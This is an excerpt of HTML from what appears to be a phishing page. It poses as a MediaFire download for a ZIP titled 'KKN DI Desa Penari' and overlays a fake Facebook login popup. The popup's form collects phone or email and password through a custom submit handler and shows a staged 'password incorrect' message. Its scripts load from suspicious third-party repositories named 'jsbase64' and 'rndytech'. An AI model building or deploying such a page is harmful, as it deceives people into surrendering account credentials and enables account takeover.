...
<title>Mediafire/drivemore/192203</title>
...
<meta property="og:title" content="KKN DI Desa Penari" />
...
<meta name="twitter:title" content="KKN DI Desa Penari" />
...
<meta itemprop="name" content="KKN DI Desa Penari " />
<meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/zip.jpg" />
<meta itemprop="description" content="" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jsbase64/css/facebook/facebook.css">
...
<div class="popup rndylogin-fb animate fadeIn">
          <div class="container-box-fb">
            <div class="atasan-fb">
              <img src="https://cdn.jsdelivr.net/gh/rndytech/backend/assets/facebook/facebook_text.png">
            </div> 
            <div class="isi-facebook">
              ...
              <p class="kaget sandi-fb">The password that you've entered is incorrect. Forgotten password?</p>
              <img src="https://i.top4top.io/p_2333oxb7w0.png">
              <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire</div>
              <form id="rndyform" class="form-login-fb" onsubmit="return verif_rndy()">
                <label>
                  <input type="text" id="user" name="user" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" style="background: none" required>
                </label>
                <label>
                  <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="off" autocapitalize="off" style="background: none" required>
                </label>
                <input type="hidden" name="login" id="login" value="Facebook" readonly>
...
<div class="dl-btn-label" title="KKN DI Desa Penari">
KKN DI Desa Penari</div>
</div>
...
<div class="filename">KKN DI Desa Penari</div>
<div class="filetype"><span>Compressed Archive</span><span> (.ZIP)<span></span></span></div>
</div>
<ul class="details">
<li>File size: <span>12.89MB</span></li>
<li>Uploaded: <span>2021-06-29 07:24:14</span></li>
</ul>
...
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/jsbase64/jquery/3.6.1/jquery.slim.min.js"></script>
